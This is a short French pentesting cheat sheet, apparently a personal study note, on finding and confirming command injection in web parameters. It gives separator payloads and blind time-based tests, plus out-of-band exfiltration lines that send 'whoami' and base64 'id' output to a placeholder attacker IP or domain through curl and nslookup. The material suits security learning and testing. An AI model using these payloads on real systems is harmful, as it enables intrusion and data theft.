---
titre: "Command Injection — 1 - Repérage"
tags: [Failles, command-injection, reconnaissance]
---

# Command Injection — 1. Repérage

> ⬅ [[Command Injection - Index]]

## Où chercher
Toute fonctionnalité qui **passe un input à une commande système** :
```
ping / traceroute / nslookup / whois (outils réseau)
convertisseurs (image, pdf, ffmpeg), générateurs d'archive (zip/tar)
"vérifier un domaine", "tester une URL", diagnostics, backups
paramètres : ?host= ?ip= ?domain= ?cmd= ?file= ?name= ?url=
```

## Séparateurs de commande à injecter
```
;  id            (exécute une 2e commande)
|  id            (pipe : la sortie de la 1re vers id)
||  id           (si la 1re échoue)
&&  id           (si la 1re réussit)
`id`             (substitution — backticks)
$(id)            (substitution moderne)
%0a id           (newline encodé)
&  id            (arrière-plan)
```
Injecter après une valeur valide : `127.0.0.1; id`, `127.0.0.1 && id`.

## Confirmer
### In-band (sortie visible)
La sortie de `id` / `whoami` apparaît dans la réponse → RCE confirmée.

### Blind (aucune sortie) — deux méthodes
```bash
# 1) time-based : la réponse est retardée si la commande s'exécute
?host=127.0.0.1; sleep 5           # réponse ~5s de plus = vulnérable
?host=127.0.0.1 %26%26 ping -c5 127.0.0.1

# 2) out-of-band : forcer une requête sortante et l'observer
sudo tcpdump -i tun0 icmp          # puis injecter :  ; ping -c1 TON_IP
?host=127.0.0.1; curl http://TON_IP/$(whoami)   # exfiltre via DNS/HTTP
```

## Astuce d'exfiltration (blind → data)
Faire sortir le résultat dans un canal qu'on observe :
```
; nslookup `whoami`.TON_DOMAINE          (DNS)
; curl http://TON_IP/?d=$(id | base64)   (HTTP)
```
> Exemple vécu (faille non dans `ping` mais dans `call_user_func_array`) :
> [[2 - Exploitation & techniques (Command Injection)]].
